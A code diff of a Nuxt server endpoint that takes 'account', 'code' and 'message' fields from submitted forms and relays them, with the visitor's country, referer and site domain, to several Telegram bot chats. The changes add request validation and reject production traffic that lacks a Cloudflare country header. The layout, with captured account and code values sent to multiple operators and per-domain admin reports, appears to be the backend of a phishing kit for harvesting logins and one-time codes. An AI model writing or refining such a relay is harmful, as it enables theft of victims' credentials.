@@ -4,6 +4,12 @@ export default defineEventHandler(async (event) => {
   // event.context.path to get the route path: '/api/foo/bar/baz'
   // event.context.params._ to get the route segment: 'bar/baz'
   const { account, code, message, newUser } = await readBody(event)
+  if (!account && !code && !message && !newUser) {
+    throw createError({
+      statusCode: 400,
+      statusMessage: 'Bad Request',
+    })
+  }
   try {
     const countryCode = event?.headers.get('CF-IPCountry')
     const countryIcon =
@@ -12,6 +18,18 @@ export default defineEventHandler(async (event) => {
     const tokens = runtimeConfig.TELEGRAM_BOT_TOKEN.split('|')
     const chatIds = runtimeConfig.TELEGRAM_CHAT_ID?.split('|')
     const adminId = runtimeConfig.ADMIN_ID
+    const HOST_PRODUCTION = runtimeConfig.HOST_PRODUCTION
+    const host = event.node.req.headers.host
+      ? event.node.req.headers.host.replace(/</g, '&lt;').replace(/>/g, '&gt;')
+      : 'N/A'
+
+    if (HOST_PRODUCTION === host && !countryCode) {
+      throw createError({
+        statusCode: 400,
+        statusMessage: 'Bad Request',
+      })
+    }
+
     console.log('tokens', tokens, 'chatIds', chatIds)
     if (!tokens || !chatIds || tokens.length !== chatIds.length) {
       throw createError({
@@ -46,8 +64,6 @@ export default defineEventHandler(async (event) => {
 `
     }
 
-    if (newUser && !countryCode) return 'ok'
-
     for (let i = 0; i < tokens.length; i++) {
       if (!tokens[i] || !chatIds[i]) {
         continue
@@ -56,9 +72,9 @@ export default defineEventHandler(async (event) => {
         console.log('sending to', chatIds[i], tokens[i])
         if (chatIds[i] === adminId) {
           messageText += `
----------------- ADMIN INFO ----------------
-<b>📡 Referer: </b>${event.headers.get('Referer').replace(/</g, '&lt;').replace(/>/g, '&gt;')}
-<b>🌐 Domain: </b>${event.node.req.headers.host ? event.node.req.headers.host.replace(/</g, '&lt;').replace(/>/g, '&gt;') : 'N/A'}
+- ADMIN INFO -
+<b>📡 Referer: </b>${event?.headers?.get('Referer')?.replace(/</g, '&lt;')?.replace(/>/g, '&gt;')}
+<b>🌐 Domain: </b>${host}
 `
         }
         await $fetch(`https://api.telegram.org/bot${tokens[i]}/sendMessage`, {
